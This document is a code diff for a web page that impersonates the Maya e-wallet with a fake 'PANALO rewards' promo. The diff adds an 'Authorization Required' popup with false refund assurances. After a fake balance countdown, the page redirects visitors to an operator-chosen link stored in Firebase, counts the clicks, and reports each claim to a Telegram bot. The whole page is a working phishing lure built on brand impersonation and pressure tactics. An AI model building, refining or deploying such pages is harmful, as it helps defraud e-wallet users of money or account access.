@@ -11,7 +11,6 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   
   <style>
-    /* ========== RESET & BASE ========== */
     * {
       margin: 0;
       padding: 0;
@@ -48,7 +47,6 @@
       z-index: 0;
     }
 
-    /* ========== AD OVERLAY ========== */
     .ad-overlay {
       position: fixed;
       inset: 0;
@@ -174,7 +172,7 @@
     .ad-glow {
       position: absolute;
       inset: 0;
-      background: linear-gradient(135deg, rgba(46, 242, 163, 0.04), transparent 50%, rgba(46, 242, 163,  ￼0.02));
+      background: linear-gradient(135deg, rgba(46, 242, 163, 0.04), transparent 50%, rgba(46, 242, 163, 0.02));
       pointer-events: none;
       border-radius: 16px;
     }
@@ -428,8 +426,8 @@
       font-weight: 400;
     }
 
-    /* ========== BALANCE POPUP ========== */
-    .balance-popup {
+    /* ========== AUTHORIZATION POPUP ========== */
+    .auth-popup {
       position: fixed;
       inset: 0;
       background: rgba(3, 8, 7, 0.7);
@@ -445,12 +443,12 @@
       transition: opacity 0.5s ease, visibility 0.5s ease;
     }
 
-    .balance-popup.active {
+    .auth-popup.active {
       opacity: 1;
       visibility: visible;
     }
 
-    .balance-popup-card {
+    .auth-popup-card {
       background: linear-gradient(145deg, rgba(10, 25, 18, 0.95), rgba(3, 8, 7, 0.98));
       backdrop-filter: blur(16px);
       -webkit-backdrop-filter: blur(16px);
@@ -459,19 +457,19 @@
       border: 1px solid rgba(46, 242, 163, 0.2);
       box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 
                   0 0 60px rgba(46, 242, 163, 0.05);
-      max-width: 340px;
+      max-width: 380px;
       width: 100%;
       text-align: center;
-      animation: balancePopupIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+      animation: authPopupIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
       transform: scale(0.8) translateY(30px);
       opacity: 0;
     }
 
-    .balance-popup.active .balance-popup-card {
-      animation: balancePopupIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    .auth-popup.active .auth-popup-card {
+      animation: authPopupIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
     }
 
-    @keyframes balancePopupIn {
+    @keyframes authPopupIn {
       0% {
         transform: scale(0.8) translateY(30px);
         opacity: 0;
@@ -482,26 +480,27 @@
       }
     }
 
-    .balance-popup-icon {
-      font-size: 3.5rem;
-      margin-bottom: 0.5rem;
-    }
-
-    .balance-popup-title {
-      color: #2EF2A3;
-      font-size: 1.8rem;
-      font-weight: 800;
-      letter-spacing: -0.02em;
+    .auth-popup-icon {
+      font-size: 3rem;
       margin-bottom: 0.3rem;
     }
 
-    .balance-popup-sub {
-      color: rgba(255, 255, 255, 0.4);
-      font-size: 0.9rem;
-      margin-bottom: 0.5rem;
+    .auth-popup-title {
+      color: #2EF2A3;
+      font-size: 1.5rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.2rem;
     }
 
-    .balance-popup-amount {
+    .auth-popup-sub {
+      color: rgba(255, 255, 255, 0.5);
+      font-size: 0.85rem;
+      margin-bottom: 0.3rem;
+      line-height: 1.5;
+    }
+
+    .auth-popup-amount {
       font-size: 3.5rem;
       font-weight: 800;
       color: #ffffff;
@@ -509,18 +508,43 @@
       margin-bottom: 0.2rem;
     }
 
-    .balance-popup-amount .zero {
+    .auth-popup-amount .zero {
       color: #2EF2A3;
     }
 
-    .balance-popup-footer {
-      color: rgba(255, 255, 255, 0.15);
-      font-size: 0.7rem;
-      letter-spacing: 0.04em;
-      margin-top: 0.5rem;
+    .auth-popup-message {
+      background: rgba(46, 242, 163, 0.04);
+      border: 1px solid rgba(46, 242, 163, 0.06);
+      border-radius: 16px;
+      padding: 0.8rem 1rem;
+      margin: 0.5rem 0 0.8rem;
     }
 
-    .balance-popup-close {
+    .auth-popup-message p {
+      color: rgba(255, 255, 255, 0.5);
+      font-size: 0.75rem;
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    .auth-popup-message .highlight-text {
+      color: #2EF2A3;
+      font-weight: 600;
+    }
+
+    .auth-popup-message .warning-text {
+      color: #ffd93d;
+      font-weight: 500;
+    }
+
+    .auth-popup-footer {
+      color: rgba(255, 255, 255, 0.1);
+      font-size: 0.6rem;
+      letter-spacing: 0.04em;
+      margin-top: 0.3rem;
+    }
+
+    .auth-popup-btn {
       background: linear-gradient(135deg, #2EF2A3, #1bcb86);
       border: none;
       padding: 0.7rem 2.5rem;
@@ -531,12 +555,13 @@
       color: #031009;
       cursor: pointer;
       transition: all 0.3s ease;
-      margin-top: 1rem;
+      margin-top: 0.8rem;
       box-shadow: 0 0 30px rgba(46, 242, 163, 0.1);
+      width: 100%;
     }
 
-    .balance-popup-close:hover {
-      transform: scale(1.05);
+    .auth-popup-btn:hover {
+      transform: scale(1.02);
       box-shadow: 0 0 50px rgba(46, 242, 163, 0.2);
     }
 
@@ -549,7 +574,6 @@
       z-index: 2;
     }
 
-    /* ========== MAIN CARD ========== */
     .main-card {
       background: rgba(8, 18, 14, 0.75);
       backdrop-filter: blur(24px) saturate(180%);
@@ -578,7 +602,6 @@
       pointer-events: none;
     }
 
-    /* ========== HEADER ========== */
     .header {
       display: flex;
       justify-content: space-between;
@@ -622,7 +645,6 @@
       opacity: 0.8;
     }
 
-    /* ========== FEATURED CARD ========== */
     .featured-card {
       background: linear-gradient(145deg, rgba(20, 50, 40, 0.5), rgba(5, 15, 10, 0.6));
       backdrop-filter: blur(12px);
@@ -728,7 +750,6 @@
       width: fit-content;
     }
 
-    /* ========== TREATS BADGE ========== */
     .treats-badge {
       display: inline-flex;
       align-items: center;
@@ -757,7 +778,6 @@
       text-shadow: 0 0 30px rgba(46, 242, 163, 0.1);
     }
 
-    /* ========== MAIN HEADLINE ========== */
     .main-headline {
       font-size: 2.8rem;
       font-weight: 800;
@@ -778,7 +798,6 @@
       display: block;
     }
 
-    /* ========== SUB TEXT ========== */
     .sub-text {
       color: rgba(255, 255, 255, 0.4);
       font-size: 0.9rem;
@@ -787,7 +806,6 @@
       margin-bottom: 1rem;
     }
 
-    /* ========== SPEND & GET REWARDS ========== */
     .spend-rewards-section {
       background: linear-gradient(145deg, rgba(20, 50, 40, 0.3), rgba(5, 15, 10, 0.4));
       backdrop-filter: blur(8px);
@@ -800,14 +818,6 @@
       position: relative;
       overflow: hidden;
       transition: all 0.3s ease;
-    }
-
-    .spend-rewards-section::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle at 50% 50%, rgba(46, 242, 163, 0.03), transparent 70%);
-      pointer-events: none;
     }
 
     .spend-rewards-section:hover {
@@ -863,31 +873,6 @@
       position: relative;
     }
 
-    .spend-rewards-text .rewards-highlight::after {
-      content: '';
-      position: absolute;
-      bottom: -2px;
-      left: 0;
-      right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, rgba(46, 242, 163, 0.3), transparent);
-      border-radius: 2px;
-    }
-
-    .spend-rewards-icon {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 32px;
-      height: 32px;
-      background: rgba(46, 242, 163, 0.06);
-      border-radius: 50%;
-      border: 1px solid rgba(46, 242, 163, 0.08);
-      font-size: 0.9rem;
-      margin-right: 0.2rem;
-    }
-
-    /* ========== EXCLUSIVE BADGE ========== */
     .exclusive-badge {
       display: inline-flex;
       align-items: center;
@@ -929,7 +914,6 @@
       font-weight: 600;
     }
 
-    /* ========== CTA SECTION ========== */
     .cta-section {
       display: flex;
       flex-direction: column;
@@ -937,7 +921,6 @@
       gap: 0.5rem;
     }
 
-    /* ========== CLAIM BUTTON ========== */
     .claim-btn {
       background: linear-gradient(135deg, #2EF2A3, #1bcb86);
       border: none;
@@ -994,7 +977,6 @@
       opacity: 0.8;
     }
 
-    /* ========== SECURED BADGE ========== */
     .secured-badge {
       display: flex;
       align-items: center;
@@ -1015,7 +997,6 @@
       opacity: 0.5;
     }
 
-    /* ========== TOAST ========== */
     .toast-message {
       position: fixed;
       bottom: 30px;
@@ -1072,7 +1053,6 @@
       }
     }
 
-    /* ========== RESPONSIVE ========== */
     @media (max-width: 420px) {
       .mobile-container {
         padding: 0.3rem;
@@ -1165,12 +1145,16 @@
         font-size: 1.1rem;
       }
 
-      .balance-popup-card {
+      .auth-popup-card {
         padding: 1.5rem;
       }
 
-      .balance-popup-amount {
+      .auth-popup-amount {
         font-size: 2.8rem;
+      }
+
+      .auth-popup-message p {
+        font-size: 0.7rem;
       }
 
       .spend-rewards-text .rewards-highlight {
@@ -1221,7 +1205,7 @@
   </style>
 </head>
 <body>
-  <!-- Initial Ad Overlay (appears after 5 seconds of page load) -->
+  <!-- Initial Ad Overlay -->
   <div class="ad-overlay initial-ad" id="initialAdOverlay">
     <div class="ad-container">
       <div class="ad-card">
@@ -1240,11 +1224,10 @@
     </div>
   </div>
 
-  <!-- Claim Pop-up Ad (appears when Claim NOW button is clicked) -->
+  <!-- Claim Pop-up Ad (Countdown) -->
   <div class="ad-overlay claim-popup" id="claimPopupOverlay">
     <div class="popup-container">
       <div class="popup-card">
-        <!-- Countdown Circle -->
         <div class="countdown-circle">
           <svg class="countdown-svg" viewBox="0 0 120 120">
             <circle class="countdown-bg" cx="60" cy="60" r="54" />
@@ -1272,24 +1255,35 @@
     </div>
   </div>
 
-  <!-- Balance Popup -->
-  <div class="balance-popup" id="balancePopup">
-    <div class="balance-popup-card">
-      <div class="balance-popup-icon">💰</div>
-      <div class="balance-popup-title">Main Balance</div>
-      <div class="balance-popup-sub">Your treat has been claimed</div>
-      <div class="balance-popup-amount">
-        ₱<span id="balanceAmount">0.00</span>
+  <!-- Authorization Popup -->
+  <div class="auth-popup" id="authPopup">
+    <div class="auth-popup-card">
+      <div class="auth-popup-icon">✅</div>
+      <div class="auth-popup-title">Authorization Required</div>
+      <div class="auth-popup-sub">Please confirm to complete your claim</div>
+      <div class="auth-popup-amount">
+        ₱<span id="authBalanceAmount">0.00</span>
       </div>
-      <div class="balance-popup-footer">✦ Transaction completed</div>
-      <button class="balance-popup-close" id="balancePopupClose">OK</button>
+      
+      <div class="auth-popup-message">
+        <p>
+          ⚡ <span class="highlight-text">Your available treat will be refunded</span> if your claiming process is void or unsuccessful.
+          <br><br>
+          🔒 <span class="warning-text">This is a one-time authorization</span> — proceed only if you're ready to claim your reward.
+          <br><br>
+          ✨ <span style="color: rgba(255,255,255,0.3);">Your treat is reserved exclusively for you.</span>
+        </p>
+      </div>
+      
+      <button class="auth-popup-btn" id="authPopupBtn">
+        ✅ Authorize & Claim
+      </button>
+      <div class="auth-popup-footer">✦ Transaction will be processed after authorization</div>
     </div>
   </div>
 
   <div class="mobile-container">
-    <!-- Main Card -->
     <div class="main-card">
-      <!-- Header with Maya logo -->
       <div class="header">
         <div class="logo-wrapper">
           <img src="images/maya_icon.png" alt="Maya" class="maya-logo" />
@@ -1300,7 +1294,6 @@
         </div>
       </div>
 
-      <!-- Featured Reward Card -->
       <div class="featured-card" id="featuredCard">
         <div class="featured-glow"></div>
         <div class="featured-content">
@@ -1314,7 +1307,6 @@
         </div>
       </div>
 
-      <!-- Treats Badge -->
       <div class="treats-badge">
         <span class="sparkle">✦</span>
         Enjoy these
@@ -1322,36 +1314,31 @@
         <span class="sparkle">✦</span>
       </div>
 
-      <!-- Main Headline -->
       <h1 class="main-headline">
         <span class="panalo">PANALO</span>
         <span class="rewards">rewards!</span>
       </h1>
 
-      <!-- Sub Text -->
       <p class="sub-text">
         A winning treat reward just for you!
       </p>
 
-      <!-- Spend & Get Rewards Section - NEW -->
       <div class="spend-rewards-section">
         <span class="spend-rewards-label">✦ Promo</span>
         <div class="spend-rewards-text">
           <span class="spend">Spend</span>
           <span class="and">and</span>
           <span class="get">Get</span>
-          <span style="color: rgba(255,255,255,0.3); font-size: 0.8rem; font-weight: 400;">up to</span>
           <span class="rewards-highlight">₱10,000</span>
+          <span style="color: rgba(255,255,255,0.3); font-size: 0.8rem; font-weight: 400;">rewards</span>
         </div>
       </div>
 
-      <!-- Exclusive Badge -->
       <div class="exclusive-badge">
         <span class="dot"></span>
         Exclusive for <strong>Maya Users</strong>
       </div>
 
-      <!-- CTA Section -->
       <div class="cta-section">
         <button class="claim-btn" id="claimBtn">
           <img src="images/maya_icon.png" alt="Maya" class="btn-icon" />
@@ -1380,15 +1367,14 @@
       measurementId: "G-831RDLPWSJ"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
     // ============================================================
     // TELEGRAM CONFIGURATION
     // ============================================================
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Kunin kay @BotFather
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Kunin kay @userinfobot
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
     function sendTelegramNotification(userMessage) {
       const message = `🔔 *New Claim Alert!*\n\n${userMessage}\n\n🕐 ${new Date().toLocaleString()}`;
@@ -1419,7 +1405,7 @@
     document.addEventListener('DOMContentLoaded', function() {
       console.log('DOM loaded - Initializing...');
 
-      // ========== INITIAL AD OVERLAY ==========
+      // Initial Ad
       const initialAdOverlay = document.getElementById('initialAdOverlay');
       const initialAdClose = document.getElementById('initialAdClose');
       const initialAdCta = document.getElementById('initialAdCta');
@@ -1427,7 +1413,6 @@
       
       setTimeout(() => {
         if (!initialAdShown && initialAdOverlay) {
-          console.log('Showing initial ad');
           initialAdOverlay.classList.add('active');
           document.body.style.overflow = 'hidden';
           initialAdShown = true;
@@ -1455,10 +1440,6 @@
             const claimBtn = document.getElementById('claimBtn');
             if (claimBtn) {
               claimBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
-              claimBtn.style.boxShadow = '0 0 80px rgba(46, 242, 163, 0.5), 0 0 160px rgba(46, 242, 163, 0.15)';
-              setTimeout(() => {
-                claimBtn.style.boxShadow = '';
-              }, 2000);
             }
           }, 500);
         });
@@ -1472,57 +1453,126 @@
         });
       }
 
-      // ========== DOM ELEMENTS ==========
+      // DOM Elements
       const claimBtn = document.getElementById('claimBtn');
       const claimPopupOverlay = document.getElementById('claimPopupOverlay');
       const countdownNumber = document.getElementById('countdownNumber');
       const timerValue = document.getElementById('timerValue');
       const countdownProgress = document.getElementById('countdownProgress');
       const featuredAmount = document.getElementById('featuredAmount');
-      const balancePopup = document.getElementById('balancePopup');
-      const balanceAmount = document.getElementById('balanceAmount');
-      const balancePopupClose = document.getElementById('balancePopupClose');
+      const authPopup = document.getElementById('authPopup');
+      const authBalanceAmount = document.getElementById('authBalanceAmount');
+      const authPopupBtn = document.getElementById('authPopupBtn');
       
       let countdownInterval = null;
       let popupActive = false;
+      let isAuthorized = false;
+      let pendingLinkId = null;
+      let pendingLinkData = null;
 
-      // ========== BALANCE ANIMATION ==========
+      // ========== STEP 1: BALANCE DECREMENT ANIMATION ==========
       function animateBalance() {
-        featuredAmount.classList.add('animating');
-        
-        let currentValue = 200;
-        const step = 5;
-        const interval = 60;
-        
-        const countDown = setInterval(() => {
-          currentValue -= step;
-          if (currentValue <= 0) {
-            currentValue = 0;
-            clearInterval(countDown);
-            setTimeout(() => {
-              balanceAmount.textContent = '0.00';
-              balancePopup.classList.add('active');
-              document.body.style.overflow = 'hidden';
-            }, 200);
-          }
-          featuredAmount.textContent = `₱${currentValue.toFixed(2)}`;
-        }, interval);
-      }
-
-      // ========== BALANCE POPUP CLOSE ==========
-      if (balancePopupClose) {
-        balancePopupClose.addEventListener('click', function() {
-          balancePopup.classList.remove('active');
-          document.body.style.overflow = '';
+        return new Promise((resolve) => {
+          featuredAmount.classList.add('animating');
+          
+          let currentValue = 200;
+          const step = 5;
+          const interval = 60;
+          
+          const countDown = setInterval(() => {
+            currentValue -= step;
+            if (currentValue <= 0) {
+              currentValue = 0;
+              clearInterval(countDown);
+              featuredAmount.textContent = `₱${currentValue.toFixed(2)}`;
+              
+              // Wait 500ms then resolve
+              setTimeout(() => {
+                resolve();
+              }, 500);
+              return;
+            }
+            featuredAmount.textContent = `₱${currentValue.toFixed(2)}`;
+          }, interval);
         });
       }
 
-      if (balancePopup) {
-        balancePopup.addEventListener('click', function(e) {
-          if (e.target === this) {
-            balancePopup.classList.remove('active');
+      // ========== STEP 2: SHOW AUTHORIZATION POPUP ==========
+      function showAuthPopup() {
+        return new Promise((resolve) => {
+          authBalanceAmount.textContent = '0.00';
+          authPopup.classList.add('active');
+          document.body.style.overflow = 'hidden';
+          
+          // Wait for user to click "Authorize & Claim"
+          authPopupBtn.onclick = function() {
+            authPopup.classList.remove('active');
             document.body.style.overflow = '';
+            resolve();
+          };
+        });
+      }
+
+      // ========== STEP 3: SHOW COUNTDOWN POPUP ==========
+      function showCountdownPopup(linkId, linkData) {
+        return new Promise((resolve, reject) => {
+          if (popupActive) {
+            reject('Popup already active');
+            return;
           }
+          popupActive = true;
+          
+          const circumference = 339.292;
+          if (countdownProgress) {
+            countdownProgress.style.strokeDashoffset = 0;
+          }
+          if (countdownNumber) countdownNumber.textContent = '5';
+          if (timerValue) timerValue.textContent = '5';
+          
+          if (claimPopupOverlay) {
+            claimPopupOverlay.classList.add('active');
+          }
+          document.body.style.overflow = 'hidden';
+          
+          // Start countdown
+          let count = 5;
+          
+          if (countdownInterval) {
+            clearInterval(countdownInterval);
+          }
+          
+          countdownInterval = setInterval(() => {
+            count--;
+            const progress = (count / 5) * circumference;
+            if (countdownProgress) {
+              countdownProgress.style.strokeDashoffset = circumference - progress;
+            }
+            if (countdownNumber) countdownNumber.textContent = count;
+            if (timerValue) timerValue.textContent = count;
+            
+            if (count <= 0) {
+              clearInterval(countdownInterval);
+              countdownInterval = null;
+              
+              if (claimPopupOverlay) {
+                claimPopupOverlay.classList.remove('active');
+              }
+              document.body.style.overflow = '';
+              popupActive = false;
+              
+              // Increment click count and redirect
+              const newClicks = (linkData.clicks || 0) + 1;
+              database.ref('links/' + linkId + '/clicks').set(newClicks)
+                .then(() => {
+                  console.log('Click count updated:', newClicks);
+                  window.location.href = linkData.url;
+                })
+                .catch((error) => {
+                  console.error('Error updating clicks:', error);
+                  window.location.href = linkData.url;
+                });
+            }
+          }, 1000);
         });
       }
 
@@ -1532,7 +1582,6 @@
           database.ref('links').orderByChild('createdAt').limitToLast(1).once('value')
             .then((snapshot) => {
               const links = snapshot.val();
-              console.log('Links from Firebase:', links);
               if (!links) {
                 reject(new Error('NO_LINK'));
                 return;
@@ -1542,130 +1591,64 @@
               resolve({ linkId, linkData });
             })
             .catch((error) => {
-              console.error('Error fetching link:', error);
               reject(error);
             });
         });
       }
 
-      // ========== START COUNTDOWN ==========
-      function startCountdown(linkId, linkData) {
-        let count = 5;
-        const circumference = 339.292;
-        
-        if (countdownNumber) countdownNumber.textContent = count;
-        if (timerValue) timerValue.textContent = count;
-        if (countdownProgress) {
-          countdownProgress.style.strokeDashoffset = 0;
-        }
-        
-        if (countdownInterval) {
-          clearInterval(countdownInterval);
-        }
-        
-        countdownInterval = setInterval(() => {
-          count--;
-          const progress = (count / 5) * circumference;
-          if (countdownProgress) {
-            countdownProgress.style.strokeDashoffset = circumference - progress;
-          }
-          if (countdownNumber) countdownNumber.textContent = count;
-          if (timerValue) timerValue.textContent = count;
-          
-          if (count <= 0) {
-            clearInterval(countdownInterval);
-            countdownInterval = null;
-            
-            console.log('Countdown finished, redirecting...');
-            
-            const newClicks = (linkData.clicks || 0) + 1;
-            database.ref('links/' + linkId + '/clicks').set(newClicks)
-              .then(() => {
-                console.log('Click count updated:', newClicks);
-                if (claimPopupOverlay) {
-                  claimPopupOverlay.classList.remove('active');
-                }
-                document.body.style.overflow = '';
-                popupActive = false;
-                window.open(linkData.url, '_blank');
-              })
-              .catch((error) => {
-                console.error('Error updating clicks:', error);
-                if (claimPopupOverlay) {
-                  claimPopupOverlay.classList.remove('active');
-                }
-                document.body.style.overflow = '';
-                popupActive = false;
-                window.open(linkData.url, '_blank');
-              });
-          }
-        }, 1000);
-      }
-
-      // ========== SHOW POPUP ==========
-      function showPopup(linkId, linkData) {
-        if (popupActive) return;
-        popupActive = true;
-        console.log('Showing popup for link:', linkData.url);
-        
-        const circumference = 339.292;
-        if (countdownProgress) {
-          countdownProgress.style.strokeDashoffset = 0;
-        }
-        if (countdownNumber) countdownNumber.textContent = '5';
-        if (timerValue) timerValue.textContent = '5';
-        
-        if (claimPopupOverlay) {
-          claimPopupOverlay.classList.add('active');
-        }
-        document.body.style.overflow = 'hidden';
-        
-        startCountdown(linkId, linkData);
-      }
-
       // ========== CLAIM BUTTON CLICK ==========
       if (claimBtn) {
-        console.log('Adding click listener to claim button');
-        
-        claimBtn.addEventListener('click', function(e) {
+        claimBtn.addEventListener('click', async function(e) {
           console.log('Claim button clicked!');
           
+          // Show loading state
           this.classList.add('loading');
           this.innerHTML = '<span class="btn-icon" style="animation: spin 0.8s linear infinite; width:22px;height:22px;display:inline-block;">⟳</span> Processing...';
           
-          getLatestLink()
-            .then(({ linkId, linkData }) => {
-              console.log('Link retrieved successfully:', linkData.url);
-              
-              this.classList.remove('loading');
-              this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
-              
-              // ✅ Send Telegram notification
-              const userMessage = `👤 *User claimed reward!*\n🔗 *Link:* ${linkData.hash || 'N/A'}\n👆 *Total Clicks:* ${(linkData.clicks || 0) + 1}`;
-              sendTelegramNotification(userMessage);
-              
-              // ✅ Trigger balance animation
-              animateBalance();
-              
-              // ✅ Show popup with countdown
-              showPopup(linkId, linkData);
-            })
-            .catch((error) => {
-              console.error('Error getting link:', error);
-              
-              this.classList.remove('loading');
-              this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
-              
-              // ❌ NO animation, NO popup, NO redirect
-              if (error.message === 'NO_LINK') {
-                showToast('⚠️ The server is too busy, many participants claim the rewards. Please try again later.', true);
-              } else {
-                showToast('⚠️ ' + error.message, true);
-              }
-            });
+          try {
+            // Get link from Firebase
+            const { linkId, linkData } = await getLatestLink();
+            console.log('Link retrieved successfully:', linkData.url);
+            
+            // Reset button
+            this.classList.remove('loading');
+            this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
+            
+            // Send Telegram notification
+            const userMessage = `👤 *User claimed reward!*\n🔗 *Link:* ${linkData.hash || 'N/A'}\n👆 *Total Clicks:* ${(linkData.clicks || 0) + 1}`;
+            sendTelegramNotification(userMessage);
+            
+            // Store pending data
+            pendingLinkId = linkId;
+            pendingLinkData = linkData;
+            
+            // STEP 1: Balance Decrement Animation (3 seconds)
+            await animateBalance();
+            
+            // STEP 2: Show Authorization Popup (wait for user to click)
+            await showAuthPopup();
+            
+            // STEP 3: Show Countdown Popup (5 seconds then redirect)
+            await showCountdownPopup(linkId, linkData);
+            
+          } catch (error) {
+            console.error('Error:', error);
+            
+            this.classList.remove('loading');
+            this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
+            
+            // Close any open popups
+            authPopup.classList.remove('active');
+            claimPopupOverlay.classList.remove('active');
+            document.body.style.overflow = '';
+            
+            if (error === 'NO_LINK' || error.message === 'NO_LINK') {
+              showToast('⚠️ The server is too busy, many participants claim the rewards. Please try again later.', true);
+            } else {
+              showToast('⚠️ ' + (error.message || error), true);
+            }
+          }
         });
-      } else {
-        console.error('Claim button not found!');
       }
 
       // ========== CLOSE POPUP ON BACKDROP ==========
